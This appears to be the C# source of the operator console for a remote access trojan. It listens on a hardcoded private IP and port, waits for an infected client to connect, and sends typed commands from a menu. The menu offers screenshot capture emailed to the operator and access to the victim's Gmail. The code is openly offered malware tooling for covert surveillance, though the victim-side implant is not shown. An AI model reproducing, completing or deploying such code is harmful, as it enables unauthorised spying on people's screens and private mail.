using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net.Mail;
using System.Net.Mime;
using System.ComponentModel;
using Microsoft.Win32;


namespace RAT
{
    class Program
    {
        

        public static void SendMessage(NetworkStream stream, String message) {
            Byte[] bytes = new Byte[256];
            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
            stream.Write(msg, 0, msg.Length);
            Console.WriteLine("Sent: {0}", message);
        }

        public static void Main()
        {


            TcpListener server = null;
            try
            {
                // Set the TcpListener on port 13000.
                Int32 port = 13001;
                IPAddress localAddr = IPAddress.Parse("192.168.21.129");

                // TcpListener server = new TcpListener(port);
                server = new TcpListener(localAddr, port);

                // Start listening for client requests.
                server.Start();

                // Buffer for reading data
                Byte[] bytes = new Byte[256];
                String data = null;

                // Enter the listening loop.
                while (true)
                {
                    Console.Write("Waiting for a connection... ");
                    
                    // Perform a blocking call to accept requests.
                    // You could also user server.AcceptSocket() here.
                    TcpClient client = server.AcceptTcpClient();
                    Console.WriteLine("Connected!");

                    data = null;

                    // Get a stream object for reading and writing
                    NetworkStream stream = client.GetStream();

                    int i;

                    // Loop to receive all the data sent by the client.
                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        string received, send; 
                        // Translate data bytes to a ASCII string.
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        Console.WriteLine("Received: {0}", data);

                        // Process the data sent by the client.
                        data = data.ToUpper();

                        byte[] msg = System.Text.Encoding.ASCII.GetBytes("OK");
                                            
                        // Send back a response.
                        stream.Write(msg, 0, msg.Length);
                        Console.WriteLine("Sent: {0}", "OK");

                        Console.WriteLine("List of commands:");
                        Console.WriteLine("1. capture - captures a screenshot and emailes it to you");
                        Console.WriteLine("2. gmail - accesses the mail of the user");
                        Console.WriteLine("3. 3sum - shows a footprint of the creators :)");
                        Console.WriteLine("4. exit - exits the program");


                        while (true) {

                            send = Console.ReadLine();

                            SendMessage(stream, send);
                            if (send == "exit")
                                break;
                        }
                    }
                    // Shutdown and end connection


                    client.Close();
                    break;
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                // Stop listening for new clients.
                server.Stop();
            }


            Console.WriteLine("\nHit enter to continue...");
            Console.Read();
        }
    }
}
